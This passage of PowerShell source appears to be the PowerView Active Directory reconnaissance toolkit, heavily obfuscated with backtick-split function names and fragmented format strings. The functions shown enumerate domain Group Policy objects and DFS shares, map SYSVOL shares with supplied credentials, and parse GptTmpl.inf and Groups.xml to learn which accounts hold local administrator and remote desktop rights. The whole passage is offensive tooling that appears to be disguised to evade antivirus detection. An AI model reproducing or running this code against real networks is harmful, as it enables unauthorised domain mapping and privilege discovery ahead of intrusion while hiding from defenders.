            }
        }
        else {
            if ( $Version -match ( (( "{0}{1}{2}"-f'a','l','lQ5L1' ) ) -rEPLACE 'Q5L',[ChaR]124)) {
                $DFSshares += Get-DomainDFSShareV1 @SearcherArguments
            }
            if (  $Version -match ( ( (  "{1}{0}{2}" -f 'l','a','lMtd2'  )).RepLACe(  'Mtd','|')  ) ) {
                $DFSshares += Get-DomainDFSShareV2 @SearcherArguments
            }
        }

        $DFSshares  |  Sort-Object -Property ( ( "{1}{0}{2}{3}"-f't','Remo','eServ','erName' ),(  "{0}{1}" -f'Na','me')) -Unique
    }
}








function GeT`-gp`TtmPL {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute( {"{2}{1}{0}"-f 'ocess','Pr','PSShould'}, '' )]
    [OutputType( [Hashtable] )]
    [CmdletBinding( )]
    Param (  
        [Parameter(MANDatOrY =  $True, vaLUefROMPIpeLinE  =  $True, VaLueFROmpIPeLINeBYPROpERtYnAME =   $True  )]
        [Alias(  {"{4}{3}{0}{2}{1}" -f'sysp','th','a','file','gpc'}, {"{1}{0}"-f'th','Pa'}  )]
        [String]
        $GptTmplPath,

        [Switch]
        $OutputObject,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(  )]
        $Credential = [Management.Automation.PSCredential]::emPty
      )

    BEGIN {
        $MappedPaths   = @{}
    }

    PROCESS {
        try {
            if (  (  $GptTmplPath -Match (  (("{2}{4}{0}{1}{3}"-f 'tL.*ItLI','tL','ItLItLI','.*','tLI' )  ) -rEPlAcE  ([chAr]73  + [chAr]116  +  [chAr]76 ),[chAr]92  ) ) -and ( $PSBoundParameters[("{0}{1}{2}" -f 'Creden','t','ial' )]) ) {
                $SysVolPath = "\\$((New-Object System.Uri($GptTmplPath)).Host)\SYSVOL "
                if ( -not $MappedPaths[$SysVolPath] ) {
                    
                    Add-RemoteConnection -Path $SysVolPath -Credential $Credential
                    $MappedPaths[$SysVolPath]   =  $True
                }
            }

            $TargetGptTmplPath  =  $GptTmplPath
            if ( -not $TargetGptTmplPath.EnDswITh(("{1}{0}"-f'inf','.' ) )) {
                $TargetGptTmplPath += (  (  (  "{6}{5}{9}{1}{3}{0}{4}{11}{10}{8}{7}{2}" -f 'Td','0Microsof','Tmpl.inf','tdE0Windows N','E0SecE','d','dE0MACHINE','Gpt','tdE0','E','i','d' ) )-REPlACE 'dE0',[CHAR]92)
            }

            Write-Verbose ( '[Ge'  +  't'  +  '-GptT'  + 'mpl] '  +'Parsi'  +  'ng'+' '  +  'GptT'+  'mp'+'l' +'Path' + ': '  +"$TargetGptTmplPath"  )

            if (  $PSBoundParameters[(  "{1}{0}{2}" -f 'tpu','Ou','tObject' )]) {
                $Contents   = Get-IniContent -Path $TargetGptTmplPath -OutputObject -ErrorAction ('S'+  'top' )
                if (  $Contents) {
                    $Contents  |  Add-Member ('Note'+'pro'  +'pe'  +  'rty'  ) ( "{1}{0}" -f'th','Pa') $TargetGptTmplPath
                    $Contents
                }
            }
            else {
                $Contents   =   Get-IniContent -Path $TargetGptTmplPath -ErrorAction (  'Sto' +  'p' )
                if (  $Contents) {
                    $Contents[(  "{0}{1}"-f 'Pat','h'  )] =   $TargetGptTmplPath
                    $Contents
                }
            }
        }
        catch {
            Write-Verbose ('[G'  +'et-GptT'+'mpl] ' +  'Er' +'ror '  + 'p' + 'a'+ 'rsing '  +"$TargetGptTmplPath "  +  ': '+ "$_"  )
        }
    }

    END {
        
        $MappedPaths.keyS | ForEach-Object { Remove-RemoteConnection -Path $_ }
    }
}


function G`eT-gR`OUPSxmL {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute( {"{3}{0}{2}{1}"-f 'S','houldProcess','S','P'}, '' )]
    [OutputType(  {"{1}{0}{4}{2}{3}"-f 'i','PowerV','sX','ML','ew.Group'})]
    [CmdletBinding( )]
    Param ( 
        [Parameter(maNdaToRY = $True, vaLUefrOmpIPEline =  $True, vAluEfRompIpELInEbYpROPErtynAME = $True  )]
        [Alias( {"{0}{1}" -f'P','ath'})]
        [String]
        $GroupsXMLPath,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(   )]
        $Credential   = [Management.Automation.PSCredential]::eMpty
      )

    BEGIN {
        $MappedPaths  =  @{}
    }

    PROCESS {
        try {
            if ((  $GroupsXMLPath -Match ((  ( "{1}{3}{2}{0}{4}" -f'WE.*PWE','P','EP','WEPWEPW','PWE.*' ) )  -RepLACe ( [CHAR]80  + [CHAR]87 + [CHAR]69),[CHAR]92)  ) -and ($PSBoundParameters[(  "{2}{1}{0}"-f'ial','edent','Cr'  )]  ) ) {
                $SysVolPath   =  "\\$((New-Object System.Uri($GroupsXMLPath)).Host)\SYSVOL "
                if ( -not $MappedPaths[$SysVolPath] ) {
                    
                    Add-RemoteConnection -Path $SysVolPath -Credential $Credential
                    $MappedPaths[$SysVolPath]   =   $True
                }
            }

            [XML]$GroupsXMLcontent   =  Get-Content -Path $GroupsXMLPath -ErrorAction ( 'St' +'op'  )

            
            $GroupsXMLcontent  |  Select-Xml (  "{2}{0}{1}"-f 'G','roup','/Groups/'  )  |   Select-Object -ExpandProperty (  'nod' +  'e' )   |  ForEach-Object {

                $Groupname  = $_.PrOpErties.GROuPNaME

                
                $GroupSID =  $_.PrOpErtIES.grouPsiD
                if ( -not $GroupSID  ) {
                    if (  $Groupname -match (  "{0}{1}{2}"-f 'Admi','nistr','ators')  ) {
                        $GroupSID  = ( "{1}{3}{2}{0}" -f'4','S-1-','2-54','5-3' )
                    }
                    elseif ( $Groupname -match ( "{2}{1}{3}{0}" -f 'Desktop','te','Remo',' '  ) ) {
                        $GroupSID  =  ("{1}{3}{0}{2}"-f'5-32','S','-555','-1-' )
                    }
                    elseif ( $Groupname -match ("{2}{1}{0}" -f's','st','Gue') ) {
                        $GroupSID   =  (  "{3}{0}{2}{1}" -f '1-5','546','-32-','S-')
                    }
                    else {
                        if (  $PSBoundParameters[("{2}{1}{0}"-f'tial','reden','C')]  ) {
                            $GroupSID  =  ConvertTo-SID -ObjectName $Groupname -Credential $Credential
                        }
                        else {
                            $GroupSID  =  ConvertTo-SID -ObjectName $Groupname
                        }
                    }
                }

                
                $Members  =   $_.PrOperTiEs.MEMBeRs  |   Select-Object -ExpandProperty (  'Membe' + 'r')  |  Where-Object { $_.ActIOn -match 'ADD' }  |   ForEach-Object {
                    if ($_.siD  ) { $_.siD }
                    else { $_.nAME }
                }

                if ( $Members) {
                    
                    if ($_.FILters ) {
                        $Filters =   $_.FiltERs.GEtENumeRAtoR()   |  ForEach-Object {
                            New-Object -TypeName (  'PS'+'Objec'+'t' ) -Property @{(  "{1}{0}" -f'ype','T'  )   =   $_.lOcalnAME  ; (  "{0}{1}"-f'Va','lue'  ) =   $_.nAMe}
                        }
                    }
                    else {
                        $Filters  = $Null
                    }

                    if ($Members -isnot [System.Array]) { $Members   =  @($Members) }

                    $GroupsXML  = New-Object ('PS' +'Objec'+ 't')
                    $GroupsXML  | Add-Member (  'Not'+ 'ep'+ 'rop' +  'erty') ("{1}{2}{0}" -f 'ath','GP','OP') $TargetGroupsXMLPath
                    $GroupsXML   |  Add-Member ('Not' + 'epro' + 'perty') ( "{2}{1}{0}" -f'ters','l','Fi' ) $Filters
                    $GroupsXML   |   Add-Member ( 'Note'+ 'pro'+ 'per'  + 'ty' ) ( "{1}{0}"-f 'me','GroupNa'  ) $GroupName
                    $GroupsXML  |   Add-Member ( 'Notepr'+ 'ope'+  'rt'+ 'y') ( "{1}{2}{0}"-f'pSID','G','rou') $GroupSID
                    $GroupsXML   |   Add-Member (  'Note' +'prop'+  'ert'+ 'y') (  "{2}{0}{1}" -f 'Mem','berOf','Group') $Null
                    $GroupsXML   |   Add-Member (  'N'  +'o'+'tep'+  'roperty'  ) (  "{2}{0}{1}" -f 'roupMemb','ers','G' ) $Members
                    $GroupsXML.PSoBjEcT.TyPeNAmeS.inSErt(  0, ( "{1}{4}{2}{5}{3}{0}"-f'ML','Power','iew','GroupsX','V','.') )
                    $GroupsXML
                }
            }
        }
        catch {
            Write-Verbose ( '[Get-' + 'Groups'+  'XML] '  + 'Err'+'o' + 'r '  +  'parsi'+  'n'+ 'g '  +"$TargetGroupsXMLPath " +  ': '  +"$_"  )
        }
    }

    END {
        
        $MappedPaths.kEys  |  ForEach-Object { Remove-RemoteConnection -Path $_ }
    }
}


function get-`d`omain`gpo {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{0}{1}{2}"-f 'oul','dProc','ess','PSSh'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{0}{3}{2}{5}{6}{1}" -f'UseDec','nts','redVar','la','PS','sMoreT','hanAssignme'}, ''  )]
    [OutputType(  {"{2}{1}{4}{3}{0}" -f 'GPO','wer','Po','ew.','Vi'} )]
    [OutputType({"{3}{1}{0}{2}"-f '.GP','ew','O.Raw','PowerVi'} )]
    [CmdletBinding(defAuLtpaRAmETeRSETNaMe = {"{1}{0}"-f 'ne','No'})]
    Param(  
        [Parameter(  pOSITion   =  0, vaLUefRoMpIpeLINe = $True, ValUEfROmpiPeLinEByPrOperTynAME = $True)]
        [Alias({"{4}{0}{2}{1}{3}" -f 'is','s','tingui','hedName','D'}, {"{4}{0}{1}{2}{3}"-f'cco','u','ntNa','me','SamA'}, {"{1}{0}" -f'me','Na'} )]
        [String[]]
        $Identity,

        [Parameter( PArAmEtErsETnAME   =   "ComPuTe`RIdE`N`T`i`TY" )]
        [Alias( {"{1}{3}{2}{0}" -f 'erName','Comp','t','u'})]
        [ValidateNotNullOrEmpty(   )]
        [String]
        $ComputerIdentity,

        [Parameter(  PArameTerseTnamE   =   "UsERi`d`e`NtIty"  )]
        [Alias( {"{2}{1}{0}" -f'me','erNa','Us'})]
        [ValidateNotNullOrEmpty(   )]
        [String]
        $UserIdentity,

        [ValidateNotNullOrEmpty(  )]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty(  )]
        [Alias({"{0}{1}"-f'F','ilter'}  )]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty(   )]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias( {"{2}{0}{1}"-f 'S','Path','AD'} )]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty(   )]
        [Alias(  {"{0}{1}{2}{3}"-f'Dom','ainCon','troll','er'} )]
        [String]
        $Server,

        [ValidateSet( {"{1}{0}"-f 'e','Bas'}, {"{1}{0}"-f 'Level','One'}, {"{1}{0}{2}"-f 're','Subt','e'})]
        [String]
        $SearchScope =   ( "{1}{0}"-f'e','Subtre'),

        [ValidateRange(1, 10000  )]
        [Int]
        $ResultPageSize  =   200,

        [ValidateRange( 1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet( {"{0}{1}" -f 'Dac','l'}, {"{1}{0}" -f 'roup','G'}, {"{1}{0}" -f 'e','Non'}, {"{1}{0}"-f'er','Own'}, {"{0}{1}" -f'S','acl'} )]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias( {"{2}{0}{1}"-f 'turnO','ne','Re'})]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(  )]
        $Credential = [Management.Automation.PSCredential]::EmPty,

        [Switch]
        $Raw
     )

    BEGIN {
        $SearcherArguments   = @{}
        if ($PSBoundParameters[(  "{1}{0}" -f'main','Do' )]  ) { $SearcherArguments[("{1}{0}{2}"-f'oma','D','in'  )] = $Domain }
        if (  $PSBoundParameters[(  "{0}{2}{3}{1}"-f'Pro','s','per','tie'  )]  ) { $SearcherArguments[( "{3}{1}{0}{2}" -f 'rtie','ope','s','Pr' )]  =   $Properties }
        if (  $PSBoundParameters[(  "{0}{1}{2}"-f 'Searc','hBas','e')]) { $SearcherArguments[(  "{2}{1}{0}"-f 'se','Ba','Search' )] =   $SearchBase }
        if ( $PSBoundParameters[( "{1}{2}{0}"-f 'r','Se','rve'  )] ) { $SearcherArguments[(  "{1}{0}" -f'er','Serv'  )]  = $Server }
        if ( $PSBoundParameters[("{1}{0}{3}{2}" -f'chS','Sear','ope','c' )]) { $SearcherArguments[("{3}{2}{1}{0}" -f 'e','op','c','SearchS'  )] =  $SearchScope }
        if ( $PSBoundParameters[(  "{1}{2}{0}{3}"-f'eSiz','Result','Pag','e' )]) { $SearcherArguments[("{1}{4}{3}{0}{2}"-f'geSi','Re','ze','ltPa','su' )]  =  $ResultPageSize }
        if ( $PSBoundParameters[(  "{3}{0}{1}{2}" -f'r','Ti','meLimit','Serve')]  ) { $SearcherArguments[("{0}{3}{1}{2}" -f 'Serve','meL','imit','rTi')]   =   $ServerTimeLimit }
        if ( $PSBoundParameters[( "{0}{4}{3}{1}{2}" -f 'S','as','ks','ityM','ecur')]) { $SearcherArguments[("{3}{0}{1}{2}" -f'ecurit','yM','asks','S'  )]   =   $SecurityMasks }
        if (  $PSBoundParameters[("{1}{0}{2}" -f'mbs','To','tone'  )] ) { $SearcherArguments[("{2}{1}{0}" -f 'stone','b','Tom')]  =  $Tombstone }
        if (  $PSBoundParameters[(  "{2}{0}{1}"-f 'reden','tial','C')]  ) { $SearcherArguments[(  "{2}{1}{0}"-f'al','edenti','Cr')] =   $Credential }
        $GPOSearcher =  Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ( $GPOSearcher  ) {
            if ( $PSBoundParameters[( "{1}{0}{2}{3}"-f 'm','Co','puterIdenti','ty'  )] -or $PSBoundParameters[(  "{2}{0}{3}{1}"-f 'rI','ntity','Use','de'  )] ) {
                $GPOAdsPaths =   @( )
                if ($SearcherArguments[( "{1}{2}{0}" -f 'es','Prop','erti'  )] ) {
                    $OldProperties =  $SearcherArguments[( "{2}{1}{0}" -f's','ie','Propert')]
                }
                $SearcherArguments[( "{0}{1}{2}"-f'Prop','ert','ies'  )]   =   ( "{0}{1}{5}{3}{6}{2}{4}"-f 'disting','ui','ostn','edname,dns','ame','sh','h'  )
                $TargetComputerName   =   $Null

                if ($PSBoundParameters[( "{0}{2}{3}{1}"-f 'C','y','omputerI','dentit' )]) {
                    $SearcherArguments[("{0}{1}{2}" -f'Ide','nt','ity' )]   =   $ComputerIdentity
                    $Computer =   Get-DomainComputer @SearcherArguments -FindOne | Select-Object -First 1
                    if(  -not $Computer ) {
                        Write-Verbose (  '[Ge' +'t-Doma'+'inGPO'  + '] ' + 'Co'  + 'm' +'puter '+  "'$ComputerIdentity' "  +'n'+'ot '+  'found'  + '!' )
                    }
                    $ObjectDN =   $Computer.DisTiNGuisHednAME
                    $TargetComputerName =   $Computer.DnshOsTNAmE
                }
                else {
                    $SearcherArguments[(  "{0}{1}"-f 'Ident','ity' )] =   $UserIdentity
                    $User  =   Get-DomainUser @SearcherArguments -FindOne |   Select-Object -First 1
                    if( -not $User ) {
                        Write-Verbose ('[Ge'  +  't'  +  '-'  + 'DomainGPO] ' +'Us' + 'er '+ "'$UserIdentity' "  +  'n' +  'ot '  +  'foun'+'d!'  )
                    }
                    $ObjectDN   = $User.disTinGUIshednAMe
                }

                
                $ObjectOUs   =  @()
                $ObjectOUs += $ObjectDN.splIt(  ',' )  | ForEach-Object {
                    if(  $_.stArtswITh('OU=' )) {
                        $ObjectDN.sUbsTRInG( $ObjectDN.inDexoF("$($_),") )
                    }
                }
                Write-Verbose ( '[Ge'  + 't-DomainGP'+  'O'+'] '  +  'o' +'bject' +' '+ 'OU' + 's: ' + "$ObjectOUs" )

                if ( $ObjectOUs) {
                    
                    $SearcherArguments.REmoVe(  ("{1}{2}{0}"-f 'ies','Prope','rt') )
                    $InheritanceDisabled  =  $False
                    ForEach( $ObjectOU in $ObjectOUs ) {
                        $SearcherArguments[( "{0}{2}{1}" -f 'Ide','y','ntit' )]  =  $ObjectOU
                        $GPOAdsPaths += Get-DomainOU @SearcherArguments  |   ForEach-Object {
                            
                            if (  $_.GPlINK) {
                                $_.gpLINk.SpLIt(  ']['  ) |   ForEach-Object {
                                    if ( $_.STArTSWITH( ("{0}{1}" -f 'LDA','P')  )) {
                                        $Parts  =   $_.SPlit( ';'  )
                                        $GpoDN  =   $Parts[0]
                                        $Enforced  = $Parts[1]

                                        if ($InheritanceDisabled ) {
                                            
                                            
                                            if (  $Enforced -eq 2  ) {
                                                $GpoDN
                                            }
                                        }
                                        else {
                                            
                                            $GpoDN
                                        }
                                    }
                                }
                            }

                            
                            if ( $_.gPOPtIONS -eq 1 ) {
                                $InheritanceDisabled   =   $True
                            }
                        }
                    }
                }

                if (  $TargetComputerName) {
                    
                    $ComputerSite   =  ( Get-NetComputerSiteName -ComputerName $TargetComputerName).SiTenaMe
                    if( $ComputerSite -and ( $ComputerSite -notlike ("{0}{1}"-f'Er','ror*')) ) {
                        $SearcherArguments[("{1}{0}{2}" -f 'enti','Id','ty' )] = $ComputerSite
                        $GPOAdsPaths += Get-DomainSite @SearcherArguments  |   ForEach-Object {
                            if(  $_.gpLiNk  ) {
                                
                                $_.gPLInK.sPlIt(  '][') | ForEach-Object {
                                    if (  $_.StARTSwitH(( "{0}{1}" -f 'LDA','P' )  ) ) {
                                        $_.sPlIt( ';')[0]
                                    }
                                }
                            }
                        }
                    }
                }

                
                $ObjectDomainDN = $ObjectDN.suBSTRIng( $ObjectDN.INDeXOF( 'DC=') )
                $SearcherArguments.remoVe(  ("{0}{1}"-f 'Id','entity') )
                $SearcherArguments.remOvE(  ("{2}{1}{0}"-f'erties','p','Pro')  )
                $SearcherArguments[(  "{1}{0}{2}"-f 'lte','LDAPFi','r'  )] = "(objectclass=domain)(distinguishedname=$ObjectDomainDN)"
                $GPOAdsPaths += Get-DomainObject @SearcherArguments |  ForEach-Object {
                    if( $_.GplInK) {
                        
                        $_.gPlinK.spLit(  '][' )   |  ForEach-Object {
                            if ( $_.STArtSWith( ("{0}{1}"-f 'LD','AP'  ) )  ) {
                                $_.Split(  ';')[0]
                            }
                        }
                    }
                }
                Write-Verbose ('[' + 'Ge' +  't-Doma'+ 'i' +  'nGPO] ' +  'GPOA'+'dsPat' +'hs: ' + "$GPOAdsPaths")

                
                if ( $OldProperties  ) { $SearcherArguments[( "{0}{2}{1}" -f'Prope','ties','r')]  =  $OldProperties }
                else { $SearcherArguments.REmoVE(  ( "{1}{0}{2}"-f'pertie','Pro','s' ) ) }
                $SearcherArguments.rEMovE(("{0}{2}{1}"-f 'Ide','ty','nti'  ) )

                $GPOAdsPaths |   Where-Object {$_ -and ( $_ -ne '' )}  | ForEach-Object {
                    
                    $SearcherArguments[( "{2}{0}{1}"-f'arc','hBase','Se' )] =  $_
                    $SearcherArguments[("{0}{1}{2}"-f 'LDAPFi','lt','er'  )]   =  (("{6}{4}{7}{2}{0}{3}{1}{5}"-f 'pPo','r','gory=grou','licyContaine','Ca',')','(object','te' )  )
                    Get-DomainObject @SearcherArguments   | ForEach-Object {
                        if ($PSBoundParameters['Raw'] ) {
                            $_.PSobJeCT.tyPENaMeS.InSERt(  0, (  "{4}{3}{5}{1}{0}{2}"-f'a','PO.R','w','V','Power','iew.G'  ))
                        }
                        else {
                            $_.PSobJecT.tYpEnAmES.INsErT(  0, ("{3}{2}{1}{0}" -f'.GPO','rView','we','Po' ) )
                        }
                        $_
                    }
                }
            }
            else {
                $IdentityFilter   =  ''
                $Filter  = ''
                $Identity |  Where-Object {$_}   |   ForEach-Object {
                    $IdentityInstance   = $_.rEplaCE('(', '\28'  ).replacE(')', '\29')
                    if (  $IdentityInstance -match ( (("{0}{3}{1}{4}{5}{2}" -f 'LDAP','0','*','://{','}','^CN=.' ) ) -f  [CHAr]124  ) ) {
                        $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                        if ( (  -not $PSBoundParameters[("{1}{2}{0}" -f 'in','D','oma' )]  ) -and (  -not $PSBoundParameters[(  "{2}{1}{0}" -f'se','a','SearchB'  )]  )  ) {
                            
                            
                            $IdentityDomain  =   $IdentityInstance.SuBsTRInG(  $IdentityInstance.INdEXOf(  'DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose ( '[Get-'  + 'Do'  + 'm' +'ai' +'nGPO] ' + 'E' + 'xt'+ 'racted '  +  'do'+  'mai'+  'n '  +  "'$IdentityDomain' " +'fr'  +  'om '+ "'$IdentityInstance'" )
                            $SearcherArguments[( "{0}{1}{2}" -f'Doma','i','n'  )]  = $IdentityDomain
                            $GPOSearcher   =   Get-DomainSearcher @SearcherArguments
                            if ( -not $GPOSearcher) {
                                Write-Warning (  '[G'  + 'et' +  '-' +  'Domai' + 'nGPO] '  +'Una'+ 'ble'+ ' '  +  't'+'o '+ 're'+'trieve'  +' ' +  'domai'  +'n '+ 'sear'+ 'che'+ 'r '  +'f'  +'or ' +  "'$IdentityDomain'"  )
                            }
                        }
                    }
                    elseif ($IdentityInstance -match '{.*}'  ) {
                        $IdentityFilter += "(name=$IdentityInstance)"
                    }
                    else {
                        try {
                            $GuidByteString   =  (  -Join (([Guid]$IdentityInstance  ).TObYTeARrAy(  )  | ForEach-Object {$_.TOStriNg(  'X' ).paDlEfT(  2,'0')}  )) -Replace (  ("{1}{0}"-f '..)','('  )),'\$1'
                            $IdentityFilter += "(objectguid=$GuidByteString)"
                        }
                        catch {
                            $IdentityFilter += "(displayname=$IdentityInstance)"
                        }
                    }
                }
                if ( $IdentityFilter -and ($IdentityFilter.TRim(  ) -ne ''  ) ) {
                    $Filter += "(|$IdentityFilter)"
                }

                if (  $PSBoundParameters[("{2}{1}{0}" -f 'lter','PFi','LDA'  )]  ) {
                    Write-Verbose ('[G'+'e' +  't-DomainGPO]' +' '  + 'Using'+  ' '  + 'addit' +'ional'  +  ' '  +'LD'+'AP '+'filte'  + 'r:'  + ' '+"$LDAPFilter"  )
                    $Filter += "$LDAPFilter"
                }

                $GPOSearcher.FIlTer =   "(&(objectCategory=groupPolicyContainer)$Filter)"
                Write-Verbose "[Get-DomainGPO] filter string: $($GPOSearcher.filter) "

                if ( $PSBoundParameters[( "{0}{1}"-f 'Find','One'  )]) { $Results   =  $GPOSearcher.fINDone( ) }
                else { $Results  =  $GPOSearcher.findALL(   ) }
                $Results |   Where-Object {$_} |   ForEach-Object {
                    if ( $PSBoundParameters['Raw']) {
                        
                        $GPO   =   $_
                        $GPO.pSObJEct.TypENAMeS.InSERt( 0, ( "{3}{1}{2}{4}{0}"-f 'Raw','View.G','P','Power','O.' ))
                    }
                    else {
                        if ($PSBoundParameters[("{2}{0}{1}"-f'rc','hBase','Sea' )] -and ($SearchBase -Match ("{1}{0}"-f'/','^GC:/'  )  )) {
                            $GPO =  Convert-LDAPProperty -Properties $_.pRoPErtiEs
                            try {
                                $GPODN =   $GPO.diSTinGuISHeDnaME
                                $GPODomain =  $GPODN.sUbStrING(  $GPODN.iNDExoF('DC=' )) -replace 'DC=','' -replace ',','.'
                                $gpcfilesyspath  = "\\$GPODomain\SysVol\$GPODomain\Policies\$($GPO.cn)"
                                $GPO   | Add-Member ('Not' +'epro' +  'perty') ("{2}{0}{1}"-f 'pcfil','esyspath','g'  ) $gpcfilesyspath
                            }
                            catch {
                                Write-Verbose "[Get-DomainGPO] Error calculating gpcfilesyspath for: $($GPO.distinguishedname) "
                            }
                        }
                        else {
                            $GPO  = Convert-LDAPProperty -Properties $_.PrOPerTIes
                        }
                        $GPO.psObjecT.tYPeNaMES.insert( 0, ( "{3}{4}{0}{2}{1}" -f 'erVi','.GPO','ew','P','ow' ) )
                    }
                    $GPO
                }
                if ($Results  ) {
                    try { $Results.diSpose(  ) }
                    catch {
                        Write-Verbose (  '[G'  +  'et'+  '-Do'  +  'mainG' + 'PO] '+'E' +  'r'+ 'ror ' +'di' + 'sp'  + 'osing ' + 'o' +  'f '+ 't'+ 'he ' +  'R'  +  'e'+'sults '  +  'o'  +'bject:'  +  ' '+"$_")
                    }
                }
                $GPOSearcher.DisPoSe(  )
            }
        }
    }
}


function Ge`T`-Dom`AiN`G`Po`L`OcALgROuP {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute( {"{2}{1}{0}{3}"-f'ro','ShouldP','PS','cess'}, '')]
    [OutputType(  {"{1}{0}{5}{2}{3}{4}"-f'iew','PowerV','o','u','p','.GPOGr'}  )]
    [CmdletBinding( )]
    Param(
        [Parameter(PoSitIon   =  0, vALuEFRoMPipeLiNe =   $True, VALUeFROMpipelIneBYPropErtynAmE   =   $True  )]
        [Alias(  {"{2}{1}{3}{0}" -f'me','h','Distinguis','edNa'}, {"{3}{1}{0}{2}{4}"-f 'c','mAc','ou','Sa','ntName'}, {"{0}{1}" -f'N','ame'})]
        [String[]]
        $Identity,

        [Switch]
        $ResolveMembersToSIDs,

        [ValidateNotNullOrEmpty(  )]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty(   )]
        [Alias( {"{1}{0}" -f 'r','Filte'}  )]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty( )]
        [Alias({"{2}{1}{0}" -f 'h','t','ADSPa'} )]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty(  )]
        [Alias( {"{3}{4}{0}{2}{1}" -f'n','troller','Con','Do','mai'} )]
        [String]
        $Server,

        [ValidateSet(  {"{0}{1}"-f 'Ba','se'}, {"{1}{2}{0}"-f 'l','O','neLeve'}, {"{1}{0}" -f 'ee','Subtr'})]
        [String]
        $SearchScope   = (  "{0}{1}{2}"-f'Su','btr','ee' ),

        [ValidateRange(1, 10000  )]
        [Int]
        $ResultPageSize  =   200,

        [ValidateRange(1, 10000  )]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(  )]
        $Credential  = [Management.Automation.PSCredential]::eMpTY
    )

    BEGIN {
        $SearcherArguments =  @{}
        if ($PSBoundParameters[("{0}{2}{1}" -f 'D','ain','om' )]  ) { $SearcherArguments[("{1}{0}" -f 'main','Do' )] = $Domain }
        if ( $PSBoundParameters[(  "{2}{0}{1}"-f'APFilt','er','LD')]  ) { $SearcherArguments[("{1}{2}{0}" -f'ilter','L','DAPF'  )] =   $Domain }
        if ( $PSBoundParameters[(  "{1}{0}{2}" -f'rchB','Sea','ase' )]  ) { $SearcherArguments[(  "{2}{0}{1}"-f 'Ba','se','Search'  )]   =   $SearchBase }
        if (  $PSBoundParameters[("{0}{2}{1}" -f 'Se','ver','r')] ) { $SearcherArguments[(  "{2}{1}{0}" -f 'r','erve','S')]   =   $Server }
        if ( $PSBoundParameters[(  "{1}{0}{2}" -f'chScop','Sear','e' )] ) { $SearcherArguments[( "{0}{1}{2}"-f'Search','Sc','ope')] =  $SearchScope }
        if (  $PSBoundParameters[("{2}{1}{0}"-f 'geSize','sultPa','Re')]  ) { $SearcherArguments[(  "{3}{4}{2}{0}{1}"-f 'tP','ageSize','sul','R','e')] =  $ResultPageSize }
        if ($PSBoundParameters[( "{2}{1}{0}{4}{3}"-f'TimeL','rver','Se','mit','i')]  ) { $SearcherArguments[( "{3}{2}{1}{0}{4}" -f 'meL','rTi','e','Serv','imit')]  =  $ServerTimeLimit }
        if ( $PSBoundParameters[("{1}{2}{0}"-f 'one','Tombs','t')]  ) { $SearcherArguments[("{1}{2}{0}" -f 'e','T','ombston'  )]   =   $Tombstone }
        if ($PSBoundParameters[( "{1}{2}{0}" -f 'ial','Cre','dent' )]  ) { $SearcherArguments[("{1}{0}{2}"-f'nt','Crede','ial' )]   = $Credential }

        $ConvertArguments  =  @{}
        if ( $PSBoundParameters[("{0}{1}" -f'Domai','n' )]) { $ConvertArguments[(  "{1}{2}{0}"-f'ain','D','om')]   = $Domain }
        if (  $PSBoundParameters[("{1}{0}"-f'ver','Ser'  )]  ) { $ConvertArguments[(  "{1}{0}" -f'rver','Se'  )]  = $Server }
        if (  $PSBoundParameters[(  "{2}{1}{0}"-f'al','nti','Crede' )]) { $ConvertArguments[(  "{0}{2}{1}" -f 'Creden','al','ti' )]  =  $Credential }

        $SplitOption  =  [System.StringSplitOptions]::remoVeEmPTyeNTrIEs
    }

    PROCESS {
        if ($PSBoundParameters[("{1}{2}{0}" -f 'ity','Ide','nt'  )]) { $SearcherArguments[("{2}{1}{0}" -f'ntity','e','Id'  )]   = $Identity }

        Get-DomainGPO @SearcherArguments |  ForEach-Object {
            $GPOdisplayName =   $_.dISpLAYnaMe
            $GPOname   = $_.NAMe
            $GPOPath   = $_.GPcFILESYSPAth

            $ParseArgs =  @{ (  "{0}{1}{2}"-f 'G','p','tTmplPath' )  =  ("$GPOPath\MACHINE\Microsoft\Windows "+( 'NTgez'+'Sec' +'Ed'+  'itg'  +'e' +'z' + 'GptTmpl'  +  '.i'  +  'nf' ).REPlAcE(  ( [chaR]103  +  [chaR]101 + [chaR]122 ),[StRiNG][chaR]92) ) }
            if ( $PSBoundParameters[(  "{2}{1}{0}"-f'al','denti','Cre'  )]  ) { $ParseArgs[("{2}{1}{3}{0}" -f'ial','e','Cred','nt' )]  = $Credential }

            
            $Inf =   Get-GptTmpl @ParseArgs

            if ($Inf -and (  $Inf.PSBase.KeYS -contains ("{4}{3}{2}{0}{1}"-f'sh','ip','er',' Memb','Group')  ) ) {
                $Memberships  = @{}

                
                ForEach ($Membership in $Inf.'Group Membership'.GEteNuMErATOR(    ) ) {
                    $Group, $Relation   =  $Membership.KEy.spliT( '__', $SplitOption  )  |  ForEach-Object {$_.TRim(  )}
                    
                    $MembershipValue =  $Membership.VAlUe  |  Where-Object {$_}   |  ForEach-Object { $_.tRIM( '*' ) }  |   Where-Object {$_}

                    if (  $PSBoundParameters[("{4}{5}{2}{1}{0}{6}{3}" -f 's','olveMember','s','SIDs','R','e','To' )]  ) {
                        
                        $GroupMembers =   @()
                        ForEach ( $Member in $MembershipValue ) {
                            if (  $Member -and ($Member.tRim(    ) -ne '' )  ) {
